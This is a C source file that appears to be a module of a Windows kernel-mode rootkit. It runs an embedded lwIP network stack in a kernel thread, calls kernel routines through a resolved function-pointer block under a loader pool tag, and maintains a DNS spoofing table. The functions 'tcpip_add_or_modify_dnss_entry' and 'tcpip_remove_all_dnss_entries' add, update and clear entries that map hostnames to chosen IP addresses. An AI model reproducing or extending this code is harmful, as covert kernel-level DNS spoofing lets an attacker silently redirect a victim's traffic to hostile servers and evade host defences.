// Интерфейсные функции

NTSTATUS tcpip_start_thread(LONG baseThreadPrioIncrement)
{
    NTSTATUS ntStatus;
    PKTHREAD pkThread = NULL;
    HANDLE hThread = NULL;
    OBJECT_ATTRIBUTES fObjectAttributes;
    USE_GLOBAL_BLOCK

    pGlobalBlock->pTcpipBlock = pGlobalBlock->pTcpipBlock;

    pGlobalBlock->pTcpipBlock->tcpipThreadMustBeStopped = FALSE;

    InitializeObjectAttributes(&fObjectAttributes, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
    ntStatus = pGlobalBlock->pCommonBlock->fnPsCreateSystemThread(&hThread, /*0x001F03FF*/THREAD_ALL_ACCESS, &fObjectAttributes, 0, 0, (PKSTART_ROUTINE)pGlobalBlock->pTcpipBlock->fntcpip_thread, NULL);

    if (ntStatus != STATUS_SUCCESS) {
        pGlobalBlock->pTcpipBlock->tcpipThreadMustBeStopped = TRUE;
        return ntStatus;
    }

    ntStatus = pGlobalBlock->pCommonBlock->fnObReferenceObjectByHandle(hThread, THREAD_ALL_ACCESS, NULL, KernelMode, (PVOID*)&pkThread, NULL);
    if (ntStatus == STATUS_SUCCESS && baseThreadPrioIncrement != 0) {
        pGlobalBlock->pCommonBlock->fnKeSetBasePriorityThread(pkThread, /*(KPRIORITY)*/baseThreadPrioIncrement);
    }

    pGlobalBlock->pCommonBlock->fnZwClose(hThread);

    pGlobalBlock->pTcpipBlock->tcpipThreadObject = (pvoid_t)pkThread;
    return ntStatus;
}

void tcpip_reinit_stack_for_adapter(pndis_adapter_t pAdapter)
{
    struct ip_addr ip, mask, gw, dns;
    struct netif *netif;
    pmod_common_block_t pCommonBlock;
    pmod_tcpip_block_t pTcpipBlock;
    USE_GLOBAL_BLOCK

    pCommonBlock = pGlobalBlock->pCommonBlock;
    pTcpipBlock = pGlobalBlock->pTcpipBlock;

    // Веделяем память для нового netif.
    pCommonBlock->fncommon_allocate_memory(pCommonBlock, &netif, sizeof(struct netif), NonPagedPool);

    if (pTcpipBlock->netif_default != NULL) {
        struct netif* pTemp = pTcpipBlock->netif_default;
        pTcpipBlock->fnnetif_remove(pTemp);
        dns.addr = 0;
        pTcpipBlock->fndns_setserver(0, &dns);
        pTcpipBlock->fndns_setserver(1, &dns);

        // Удаляем старый netif.
        pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pTemp, LOADER_TAG);
    }

    ip.addr = pAdapter->ipAddr;
    mask.addr = pAdapter->ipMask;
    gw.addr = pAdapter->ipGateway;

    // Код перенесён из ethernetif_init
    /* initialize the hardware */
    netif->hwaddr_len = ETHARP_HWADDR_LEN;
    netif->hwaddr[0] = pAdapter->macAddr[0];
    netif->hwaddr[1] = pAdapter->macAddr[1];
    netif->hwaddr[2] = pAdapter->macAddr[2];
    netif->hwaddr[3] = pAdapter->macAddr[3];
    netif->hwaddr[4] = pAdapter->macAddr[4];
    netif->hwaddr[5] = pAdapter->macAddr[5];
    netif->mtu = /*1492;//*/1500;

    pTcpipBlock->fnnetif_add(netif, &ip, &mask, &gw, NULL, pTcpipBlock->fnethernetif_init/*, tcpip_input*/);
    pTcpipBlock->fnnetif_set_default(netif);
    pTcpipBlock->fnnetif_set_up(netif);

    if (pAdapter->ipNameServers[0] != 0) {
        dns.addr = pAdapter->ipNameServers[0];
        pTcpipBlock->fndns_setserver(0, &dns);
    }

    if (pAdapter->ipNameServers[1] != 0) {
        dns.addr = pAdapter->ipNameServers[1];
        pTcpipBlock->fndns_setserver(1, &dns);
    }
}

void tcpip_shutdown_routine()
{
    NTSTATUS ntStatus;
//    LARGE_INTEGER delay;
    USE_GLOBAL_BLOCK

    if (!pGlobalBlock->pTcpipBlock->tcpipThreadMustBeStopped && pGlobalBlock->pTcpipBlock->tcpipThreadObject != NULL) {
        pGlobalBlock->pTcpipBlock->tcpipThreadMustBeStopped = TRUE;

        ntStatus = pGlobalBlock->pCommonBlock->fnKeWaitForSingleObject(pGlobalBlock->pTcpipBlock->tcpipThreadObject, Executive, KernelMode, FALSE, NULL);
        pGlobalBlock->pCommonBlock->fnObfDereferenceObject(pGlobalBlock->pTcpipBlock->tcpipThreadObject);
    }


    pGlobalBlock->pTcpipBlock->fnudp_remove(pGlobalBlock->pTcpipBlock->dns_pcb);
    pGlobalBlock->pTcpipBlock->fnudp_remove(pGlobalBlock->pTcpipBlock->sntp_pcb);

#if IP_REASSEMBLY
    pGlobalBlock->pTcpipBlock->fnsys_untimeout(pGlobalBlock->pTcpipBlock->fnip_reass_timer, NULL);
#endif /* IP_REASSEMBLY */
#if LWIP_ARP
    pGlobalBlock->pTcpipBlock->fnsys_untimeout(pGlobalBlock->pTcpipBlock->fnarp_timer, NULL);
#endif /* LWIP_ARP */
#if LWIP_DNS
    pGlobalBlock->pTcpipBlock->fnsys_untimeout(pGlobalBlock->pTcpipBlock->fndns_timer, NULL);
#endif /* LWIP_DNS */

    pGlobalBlock->pTcpipBlock->fntcpip_remove_all_dnss_entries();

    pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pGlobalBlock->pTcpipBlock, LOADER_TAG);
}

void tcpip_remove_all_dnss_entries()
{
    LARGE_INTEGER delay;
    pdns_spoof_entry_t pHead;
    pdns_spoof_entry_t pEntry;
    USE_GLOBAL_BLOCK

    delay.QuadPart = -10000000I64;  // 1 секунда
    while (pGlobalBlock->pTcpipBlock->dnsSpooferPaused) {
        pGlobalBlock->pCommonBlock->fnKeDelayExecutionThread(KernelMode, FALSE, &delay);
    }
    InterlockedExchange(&pGlobalBlock->pTcpipBlock->dnsSpooferPaused, TRUE);

    pHead = &pGlobalBlock->pTcpipBlock->dnsSpoofHead;
    pEntry = (pdns_spoof_entry_t)pHead->Flink;

    while (pEntry != pHead) {
        pdns_spoof_entry_t pTmp = (pdns_spoof_entry_t)pEntry->Blink;
        pGlobalBlock->pCommonBlock->fncommon_remove_entry_list((PLIST_ENTRY)pEntry);
        pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pEntry, LOADER_TAG);
        pEntry = (pdns_spoof_entry_t)pTmp->Flink;
    }

    InterlockedExchange(&pGlobalBlock->pTcpipBlock->dnsSpooferPaused, FALSE);
}

void tcpip_add_or_modify_dnss_entry(const char* sUrl, uint32_t ipAddr)
{
    pdns_spoof_entry_t pHead;
    pdns_spoof_entry_t pEntry;
    USE_GLOBAL_BLOCK

    pHead = &pGlobalBlock->pTcpipBlock->dnsSpoofHead;
    pEntry = (pdns_spoof_entry_t)pHead->Flink;

    while (pEntry != pHead) {
        if (pGlobalBlock->pCommonBlock->fnstrcmp(pEntry->name, sUrl) == 0) {
            break;
        }
        pEntry = (pdns_spoof_entry_t)pEntry->Flink;
    }

    if (pEntry == pHead) {
        size_t urlLen = pGlobalBlock->pCommonBlock->fncommon_strlen_s(sUrl, NTSTRSAFE_MAX_LENGTH);
        pdns_spoof_entry_t pDnssEntry;

        pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pDnssEntry, sizeof(dns_spoof_entry_t) + urlLen, NonPagedPool);
        pDnssEntry->type = ns_t_a;
        pDnssEntry->ipAddr = ipAddr;
        pGlobalBlock->pCommonBlock->fncommon_strcpy_s(pDnssEntry->name, urlLen + 1, sUrl);
        pGlobalBlock->pCommonBlock->fncommon_insert_tail_list((PLIST_ENTRY)&pGlobalBlock->pTcpipBlock->dnsSpoofHead, (PLIST_ENTRY)pDnssEntry);
    }
    else {
        pEntry->ipAddr = ipAddr;
    }
}